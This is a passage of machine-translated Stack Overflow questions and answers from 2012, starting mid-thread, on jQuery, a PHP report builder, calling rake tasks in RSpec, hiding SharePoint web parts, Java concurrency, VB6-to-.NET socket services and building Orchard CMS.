                $("#transferor_name").val(sole_transferors[transferor_counter]);
                console.log(sole_transferors[transferor_counter]);
            }
            // console.log(sole_transferors[transferor_counter]);
        } 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-12-04T14:20:29.147

### 你想这样做吗？

```
$("#transferor_name").val(sole_transferors[transferor_counter].val()); 
```

你需要`.val()`在最后使用吗？

# php - 报告 - 用户设计报告 - 如何构建一个非常复杂的动态查询

> ID：13704965
> 
> 赞同：0
> 
> 时间：2012-12-04T14:19:01.817
> 
> 标签：php, mysql, report

我有一个基于 PHP 的 HR SaaS。

我们有很多对象（公司、客户、设备、提案等……比如迷你 ERP）。

我们今天做报告的方式是……每一个都是一个方法，有一个固定的查询，固定的列等。

我想构建一个报告类，用户可以在其中选择从哪个对象中选择哪些列来构建自己的报告（如 vtigercrm、sugarcrm）。

我真正的困难是使用连接、选择、组等来构建查询。

对构建报告的良好数据库模型有何建议？

ps：抱歉英语不好。

Tkz罗伯托

# ruby-on-rails-3 - 如何在 rspec 中调用 rake 任务

> ID：13704976
> 
> 赞同：10
> 
> 时间：2012-12-04T14:19:43.007
> 
> 标签：ruby-on-rails-3, rspec, rake, rspec-rails

我正在尝试在我的 rspec 中调用 rake 任务。

```
 require "rake"
  rake = Rake::Application.new
  Rake.application = rake
  rake.init
  rake.load_rakefile
  rake['rake my:task'].invoke 
```

但我收到错误

```
 Failure/Error: rake['rake db:migrate'].invoke
 RuntimeError:
   Don't know how to build task 'rake db:migrate' 
```

有谁知道我们如何在 rspec 代码中调用 rake 任务。

任何帮助将不胜感激。

* * *

## 回答 #1

> 赞同：12
> 
> 时间：2012-12-04T14:33:51.280

小命名空间问题，任务`db:migrate`不像`rake db:migrate`命令行使用。

因此，将其更改为此应该会有所帮助：

```
rake['db:migrate'].invoke 
```

* * *

## 回答 #2

> 赞同：11
> 
> 时间：2015-02-20T17:54:27.700

使用 Rspec 的 Rails 更简单的解决方案：

在您的`spec_helper`（或`rails_helper`对于较新版本的 rspec-rails）中：

```
require "rake"
Rails.application.load_tasks 
```

然后，当您想调用您的任务时，您可以执行以下操作：

```
Rake::Task['my:task'].invoke 
```

* * *

## 回答 #3

> 赞同：3
> 
> 时间：2014-01-06T08:40:36.343

将方括号中的参数传递给`invoke`：

```
rake sim:manual_review_referral_program[3,4] 
```

变成：

```
rake['sim:manual_review_referral_program'].invoke(3,4) 
```

如果您`args`在数组中，则可以执行以下操作：

```
args = [3,4]
rake['sim:manual_review_referral_program'].invoke(*args) 
```

此 StackOverflow 问题的更多信息：[如何从 Rake 任务中运行 Rake 任务？](https://stackoverflow.com/questions/577944/how-to-run-rake-tasks-from-within-rake-tasks).

# javascript - 根据 Sharepoint 列表值隐藏 webpart

> ID：13704978
> 
> 赞同：0
> 
> 时间：2012-12-04T14:19:57.087
> 
> 标签：javascript, sharepoint-2010

我正在寻找 JavaScript 来隐藏基于显示表单中的字段值的 web 部件。

场景：我添加了 2 个 webpart 来显示来自不同列表的表单，我需要根据 webpart 1 的值隐藏 webpart 2。

示例：Webpart 1 的状态 =“Approved”，如果不等于“Approved”，则需要隐藏 Webpart 2。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-01-25T23:16:11.473

有几种方法可以解决这个问题，这实际上取决于你在做什么。你没有给我们大量的信息。

JavaScript 本身做你正在寻找的东西非常简单。你可以这样做：

```
$(document).ready(function () {
    $("#theButton").click(function () {
        var txtInput = $("#txtInput").val();
        if (txtInput == "Approved") {
            $("#two").show();
        } else {
            $("#two").hide();
        }
    });
}); 
```

在行动中看到它：http: [//jsfiddle.net/tadams88/6Mmb9/](http://jsfiddle.net/tadams88/6Mmb9/)

你可以让它在 document.ready 上运行，而不是让它成为一个点击功能。

我看到您可以解决此问题的另一种方法是使用连接的 Web 部件。你可以在这里阅读：http: [//msdn.microsoft.com/en-us/library/ms469765 (v=office.14).aspx](http://msdn.microsoft.com/en-us/library/ms469765(v=office.14).aspx)

连接的 Web 部件允许一个 Web 部件将值传递给另一个，这可能意味着第一个 Web 部件可以告诉第二个 Web 部件是否显示。

# java - 如何处理具有恒定运行时间的随机激活线程？

> ID：13704983
> 
> 赞同：-1
> 
> 时间：2012-12-04T14:20:07.210
> 
> 标签：java, multithreading

我不确定这是由java自动处理还是我应该处理这样的事件......

假设我有一个在随机时间从外部调用的方法，并且具有恒定的运行时间。如果我们说它的运行时间是 t，那么可能会出现突发情况，即每隔小于 t 的某个 t0 调用该方法，因此该方法还没有完成运行并且它已经被再次调用。在这种情况下，我是手动缓冲它的请求还是 java 为我这样做？

谢谢

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-12-04T14:29:26.343

对方法的请求会自动排队，除非请求已从单独的线程发出，在这种情况下，方法将并发执行（在这种情况下，您可能希望使用并发构造 - 例如，提供互斥访问）。

# c# - 由 VB6 应用程序使用的用 .NET 编写的 Windows 服务

> ID：13704989
> 
> 赞同：0
> 
> 时间：2012-12-04T14:20:23.787
> 
> 标签：c#, .net, vb6, windows-services

这个问题是对先前提出的问题的跟进：[link](https://stackoverflow.com/questions/13587761/windows-service-written-in-net-accessible-from-vb6)

我必须在 .NET/C# 中开发 Windows 服务。该服务必须由用 VB6 编写的应用程序使用。该服务实现 Quartz.NET 来处理计划任务，并且必须实现侦听器才能启动由 VB6 应用程序启动的功能。

VB6 团队的要求是能够使用 Winsock。因此我必须使用套接字和侦听器。问题是我没有这方面的经验，我更像是一个 WCF 人。

我现在正在查看 TcpListener 类，看看它是否符合要求。

我的第一个问题：如果我实现 TcpListener 类，VB6 团队是否能够使用该服务，同时牢记使用 VB6 的缺点（例如数据结构和二进制格式）？

我的第二个问题：假设 VB6 应用程序必须有 3 个函数可用，并且创建了 1 个侦听器。执行此操作的最佳实践是什么？

再次：非常感谢任何建议！

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-12-04T14:59:25.083

将有效负载作为 XML、文本键/值对、JSON 或其他松散的序列化格式传递可以帮助您的协议面向未来。这允许您随意使用甚至添加新的可选方法参数到服务器端。

除了“方法”字段之外，您还可以有一个“协议版本”字段。当进行重大更改（新的必需参数、现有参数类型的更改等）时，您可以在过渡期间使用版本号来处理新旧客户端 - 这可能跨越数年。

至于在 TCP 流之上提供消息帧，您可以使用某种简单的 EOM 分隔符或包含二进制或文本长度前缀的消息头。

您也可以考虑命名管道。 [从 VB6 程序调用TransactNamedPipe()](http://msdn.microsoft.com/en-us/library/windows/desktop/aa365790%28v=vs.85%29.aspx)相当容易。这会为您解决消息边界问题 - 假设您想要一个 RPC 样式的协议而不是异步发送/接收。

或者你可能会一直使用 MSMQ。专用机器队列不需要大量管理。但即使 VB6 和 .Net 都具有出色的 MSMQ 支持，大多数开发人员对此知之甚少。

# visual-studio-2012 - 无法在 Visual Studio 2012 中编辑 Orchard CMS 站点

> ID：13704998
> 
> 赞同：5
> 
> 时间：2012-12-04T14:20:57.080
> 
> 标签：visual-studio-2012, orchardcms

我正在尝试使用 Orchard CMS 创建一个站点。首先，我从 WebMatrix 下载/安装了 Orchard。我使用“默认”配方成功设置了一个站点。然后我单击左侧手风琴内的“文件”选项卡。从这里，我可以看到我项目中的所有文件。要开始在 Visual Studio 2012 中进行编辑，我单击功能区中的“Visual Studio”按钮。

进入 Visual Studio 后，我右键单击解决方案并选择“重建解决方案”。解决方案开始构建，但随后我收到错误消息。错误说：

*错误 1 ​​对象引用未设置为对象的实例。C:\Users\用户名\Documents\我的网站\Orchard CMS2\Modules\Contrib.Cache\Contrib.Cache.csproj 1*

请注意，在这一点上，我什至没有编辑过一个文件。相反，我创建了一个基本站点并尝试在 Visual Studio 中打开它。我究竟做错了什么？

* * *

## 回答 #1

> 赞同：11
> 
> 时间：2012-12-04T17:45:30.577

只有完整的源代码会在 Visual Studio 中构建。您可以编辑在 Visual Studio 中下载的已编译网站版本，但无法构建它。它实际上*不需要*构建，因为它内置了动态编译。

如果要构建框架和核心，请获取完整的源代码版本。